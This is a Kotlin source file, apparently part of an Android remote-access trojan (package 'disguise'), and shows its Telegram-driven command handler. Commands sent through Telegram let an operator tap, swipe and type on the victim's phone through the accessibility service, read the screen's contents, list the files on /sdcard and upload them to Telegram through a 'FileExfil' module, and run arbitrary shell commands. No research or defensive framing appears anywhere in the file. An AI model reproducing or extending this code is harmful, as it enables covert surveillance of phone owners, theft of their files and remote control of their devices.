package com.example.disguise.core

import android.content.Context
import android.util.Log
import com.example.disguise.control.AccessibilityHelper
import com.example.disguise.control.ScreenReader
import com.example.disguise.files.FileExfil
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

/**
 * CommandHandler — يوزّع الأوامر النصية القادمة من تيليجرام إلى الوحدات المناسبة.
 *
 * صيغة الأوامر (نصية بسيطة لتسهيل الاستخدام من تيليجرام):
 *   /help                         — قائمة الأوامر
 *   /tap X Y                      — نقرة في إحداثيات
 *   /swipe X1 Y1 X2 Y2 [MS]       — سحب (ms افتراضي 300)
 *   /text النص                    — كتابة نص في الحقل المركّز
 *   /screen                       — قراءة شجرة الشاشة الحالية
 *   /ls [PATH]                    — عرض محتويات مجلد (افتراضي /sdcard/)
 *   /pull PATH                    — سحب ملف إلى تيليجرام
 *   /back                         — زر الرجوع
 *   /home                         — زر الرئيسية
 *   /recents                      — قائمة التطبيقات الحديثة
 *   /notif                        — فتح لوحة الإشعارات
 *   /shell CMD                    — تنفيذ أمر shell (يتطلب صلاحية، غالباً غير متاح)
 *
 * ملاحظة: كل الأوامر تُنفَّذ في coroutine مستقل، حتى لا تحجب حلقة polling.
 */
class CommandHandler(
    private val context: Context,
    private val accessibilityHelper: AccessibilityHelper?,
    private val screenReader: ScreenReader?,
    private val fileExfil: FileExfil
) {

    companion object {
        private const val TAG = "CommandHandler"
    }

    // نطاق مستقل لتنفيذ الأوامر (لا يحجب polling)
    private val execScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * نقطة الدخول: تُستدعى من TelegramController عند وصول رسالة.
     * تُطلق coroutine مستقلة لكل أمر.
     */
    fun handle(commandText: String, reporter: TelegramReporter?) {
        if (reporter == null) {
            Log.w(TAG, "reporter is null, ignoring command")
            return
        }
        execScope.launch {
            try {
                dispatch(commandText.trim(), reporter)
            } catch (e: Exception) {
                Log.e(TAG, "command error: ${e.message}", e)
                reporter.sendMessage("⚠️ خطأ: ${e.message}")
            }
        }
    }

    /**
     * التحليل الفعلي وتوزيع الأوامر.
     */
    private suspend fun dispatch(raw: String, reporter: TelegramReporter) {
        // إزالة الشرطة المائلة إن وجدت
        val text = raw.removePrefix("/").trim()
        if (text.isEmpty()) return

        val parts = text.split(" ", limit = 2)
        val cmd = parts[0].lowercase()
        val args = if (parts.size > 1) parts[1] else ""

        when (cmd) {

            // ============ المساعدة ============
            "help", "start" -> {
                reporter.sendMessage(
                    """
                    🤖 *الأوامر المتاحة:*
                    
                    /tap X Y — نقرة
                    /swipe X1 Y1 X2 Y2 [MS] — سحب
                    /text النص — كتابة
                    /screen — قراءة الشاشة
                    /ls [PATH] — عرض مجلد
                    /pull PATH — سحب ملف
                    /back — رجوع
                    /home — رئيسية
                    /recents — التطبيقات الحديثة
                    /notif — الإشعارات
                    """.trimIndent()
                )
            }

            // ============ التحكم ============
            "tap" -> {
                val coords = args.split(" ")
                if (coords.size < 2) {
                    reporter.sendMessage("⚠️ الاستخدام: /tap X Y")
                    return
                }
                val x = coords[0].toFloatOrNull()
                val y = coords[1].toFloatOrNull()
                if (x == null || y == null) {
                    reporter.sendMessage("⚠️ إحداثيات غير صحيحة")
                    return
                }
                if (accessibilityHelper == null) {
                    reporter.sendMessage("⚠️ خدمة إمكانية الوصول غير مفعّلة")
                    return
                }
                accessibilityHelper.tap(x, y)
                reporter.sendMessage("✅ نقرة على ($x, $y)")
            }

            "swipe" -> {
                val a = args.split(" ")
                if (a.size < 4) {
                    reporter.sendMessage("⚠️ الاستخدام: /swipe X1 Y1 X2 Y2 [MS]")
                    return
                }
                val x1 = a[0].toFloatOrNull()
                val y1 = a[1].toFloatOrNull()
                val x2 = a[2].toFloatOrNull()
                val y2 = a[3].toFloatOrNull()
                val ms = if (a.size >= 5) a[4].toLongOrNull() ?: 300L else 300L
                if (x1 == null || y1 == null || x2 == null || y2 == null) {
                    reporter.sendMessage("⚠️ إحداثيات غير صحيحة")
                    return
                }
                if (accessibilityHelper == null) {
                    reporter.sendMessage("⚠️ خدمة إمكانية الوصول غير مفعّلة")
                    return
                }
                accessibilityHelper.swipe(x1, y1, x2, y2, ms)
                reporter.sendMessage("✅ سحب من ($x1,$y1) إلى ($x2,$y2) في $ms ms")
            }

            "text" -> {
                if (args.isBlank()) {
                    reporter.sendMessage("⚠️ الاستخدام: /text النص")
                    return
                }
                if (accessibilityHelper == null) {
                    reporter.sendMessage("⚠️ خدمة إمكانية الوصول غير مفعّلة")
                    return
                }
                val ok = accessibilityHelper.setText(args)
                if (ok) reporter.sendMessage("✅ تم إدخال النص")
                else reporter.sendMessage("⚠️ لم يتم العثور على حقل إدخال مركّز")
            }

            "back" -> {
                accessibilityHelper?.globalAction(AccessibilityHelper.ACTION_BACK)
                reporter.sendMessage("✅ رجوع")
            }

            "home" -> {
                accessibilityHelper?.globalAction(AccessibilityHelper.ACTION_HOME)
                reporter.sendMessage("✅ رئيسية")
            }

            "recents" -> {
                accessibilityHelper?.globalAction(AccessibilityHelper.ACTION_RECENTS)
                reporter.sendMessage("✅ التطبيقات الحديثة")
            }

            "notif" -> {
                accessibilityHelper?.globalAction(AccessibilityHelper.ACTION_NOTIFICATIONS)
                reporter.sendMessage("✅ الإشعارات")
            }

            // ============ قراءة الشاشة ============
            "screen" -> {
                if (screenReader == null) {
                    reporter.sendMessage("⚠️ خدمة إمكانية الوصول غير مفعّلة")
                    return
                }
                reporter.sendChatAction("typing")
                val dump = screenReader.dump()
                if (dump.isBlank()) {
                    reporter.sendMessage("(شاشة فارغة أو غير قابلة للقراءة)")
                } else {
                    reporter.sendMessage(dump)
                }
            }

            // ============ الملفات ============
            "ls" -> {
                val path = if (args.isBlank()) "/sdcard/" else args
                reporter.sendChatAction("typing")
                val listing = fileExfil.list(path)
                reporter.sendMessage(listing)
            }

            "pull" -> {
                if (args.isBlank()) {
                    reporter.sendMessage("⚠️ الاستخدام: /pull PATH")
                    return
                }
                reporter.sendChatAction("upload_document")
                val file = File(args)
                if (!file.exists()) {
                    reporter.sendMessage("⚠️ الملف غير موجود: ${file.absolutePath}")
                    return
                }
                if (!file.canRead()) {
                    reporter.sendMessage("⚠️ لا يمكن قراءة الملف (صلاحيات)")
                    return
                }
                reporter.sendDocument(file, caption = "📎 ${file.name}")
            }

            // ============ shell (غالباً غير متاح بدون root) ============
            "shell" -> {
                if (args.isBlank()) {
                    reporter.sendMessage("⚠️ الاستخدام: /shell CMD")
                    return
                }
                val output = runShell(args)
                reporter.sendMessage(output)
            }

            else -> {
                reporter.sendMessage("⚠️ أمر غير معروف: /$cmd\nأرسل /help للقائمة")
            }
        }
    }

    /**
     * تنفيذ أمر shell (بدون root، معظم الأوامر ستفشل).
     * نستخدم Runtime.exec.
     */
    private suspend fun runShell(cmd: String): String = withContext(Dispatchers.IO) {
        try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            process.waitFor()
            buildString {
                if (output.isNotBlank()) append("STDOUT:\n").append(output).append("\n")
                if (error.isNotBlank()) append("STDERR:\n").append(error)
                if (output.isBlank() && error.isBlank()) append("(لا مخرجات)")
            }
        } catch (e: Exception) {
            "⚠️ فشل تنفيذ الأمر: ${e.message}"
        }
    }
}